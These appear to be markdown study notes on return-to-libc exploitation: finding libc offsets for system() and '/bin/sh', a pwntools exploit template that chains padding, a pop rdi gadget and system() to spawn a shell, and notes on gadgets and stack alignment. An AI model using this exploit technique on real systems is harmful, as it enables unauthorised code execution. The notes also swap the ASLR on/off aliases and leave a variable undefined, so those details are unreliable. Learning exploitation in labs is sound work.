![alt text](https://miro.medium.com/max/480/1*Y217A9lJL0IznoeQ3tLFVg.jpeg)

A **"return-to-libc" attack** is a [computer security](https://en.wikipedia.org/wiki/Computer_security "Computer security") attack usually starting with a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow "Buffer overflow") in which a subroutine [return address](https://en.wikipedia.org/wiki/Return_statement "Return statement") on a [call stack](https://en.wikipedia.org/wiki/Call_stack "Call stack") is replaced by an address of a subroutine that is already present in the [process](https://en.wikipedia.org/wiki/Process_(computing) "Process (computing)") executable memory, bypassing the [no-execute bit](https://en.wikipedia.org/wiki/NX_bit "NX bit") feature (if present) and ridding the attacker of the need to [inject](https://en.wikipedia.org/wiki/Code_injection "Code injection") their own code. The first example of this attack in the wild was contributed by [Alexander Peslyak](https://en.wikipedia.org/wiki/Solar_Designer "Solar Designer") on the [Bugtraq](https://en.wikipedia.org/wiki/Bugtraq "Bugtraq") mailing list in 1997.

---



![](https://imgs.search.brave.com/NRHpPSjASQpFcQPzSDNuukh85MMmop77YkJAExCn02Q/rs:fit:1200:720:1/g:ce/aHR0cHM6Ly9pLnl0/aW1nLmNvbS92aS9G/dlFZR0FNMVg5VS9t/YXhyZXNkZWZhdWx0/LmpwZw)

---

## finding 'parts' for ret2libc 

```bash
# this will return the offset of the string within libc
strings -a -t x libc.so.6 | grep "/bin/sh"
strings -a -t x libc.so.6 | grep "/bin/bash"

# find offset of system() in libc 
readelf -s libc.so.6 | grep "system" # or any function you wanna call

# other useful functions primarely for memory leaks
readelf -s libc.so.6 | grep "puts"
readelf -s libc.so.6 | grep "printf"
```


```python
# finding /bin/sh with pwntools
from pwn import *

libc=ELF('libc.so.6')
libc_binsh=libc.search("/bin/sh\x00").next()
```

##### NOTE:
```bash
# MAKE SURE ASLR IS TURNED OFF WHEN TRYING TO FIND  LIBC BASE (AND OTHER STUFF)
alias aslr_on="echo 0 > /proc/sys/kernel/randomize_va_space"  
alias aslr_off="echo 2 > /proc/sys/kernel/randomize_va_space"
```

---

## crafting an example exploit

(**note**)
```
use offsets gathered and subtract from the base address of libc to call the function
```

```python
# PSUEDO EXPLOIT
# https://stacklikemind.io/ret2libc-aslr
from pwn import *

"""
:OFFSETS
	1b3e1a /bin/sh
	libc base 0x00007fdecd5c2000
	14b30 __libc_system
"""

binary = context.binary = ELF("./binary", checksec=True)
p = process()


pop_rdi = p64(0x400784)
sh = p64(next(libc.search(b"/bin/sh")))
sys = p64(libc.symbols["system"])
padd = b"A"*80

"""
: stack alignment for movaps instruction ubuntu
: simple pointer to a ret function just to keep the stackaligned by 16 bytes
stack_alignment = p64(0x00400784)
"""


payload = padd + pop_rdi + sh + sys
p.sendline(payload)
p.interactive()
p.close()
```

```asm
pop rdi   ; put data from the top of the stack into rdi and increment rsp
ret       ; Pops the return address off the stack and into the instruction pointer 
```

- https://github.com/david942j/one_gadget  The best tool for finding one gadget arbitrary code execution in libc


---

# NOTES:

##### LIBC
> Plenty of programs use functions from the standard C library. To provide a standard runtime environment and to save space, those functions are packaged in a separate file (`libc.so`). During the application startup, this file is loaded into the program’s memory and shared library functions can now be called. You can see where libc is loaded by running the command `vmmap` in GDB-Peda).

##### Calling Conventions
> In `amd64` architecture, the calling convention (order and place from where args are read) for integers is the following:
> -   `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`

##### Gadgets:
- an attacker gains control of the [call stack](https://en.wikipedia.org/wiki/Call_stack "Call stack") to hijack program [control flow](https://en.wikipedia.org/wiki/Control_flow "Control flow") and then executes carefully chosen [machine instruction](https://en.wikipedia.org/wiki/Machine_instruction "Machine instruction") sequences that are already present in the machine's memory, called "gadgets"
- calling different instructions from memory


> Ideally, a gadget contains no extra instructions between the ones we need and the `ret`. Otherwise we might have to take the extra instructions into account and adjust our payload accordingly. Sometimes, there are no perfect gadgets available.

##### movaps bullshit:
- This is unique to **Ubuntu**. It has its own version of libc, in which system has additional `movaps` instructions for moving data to the stack. These instructions require the stack to be aligned by `16 bytes`. When the stack is not aligned, the `movaps` will trigger an error.
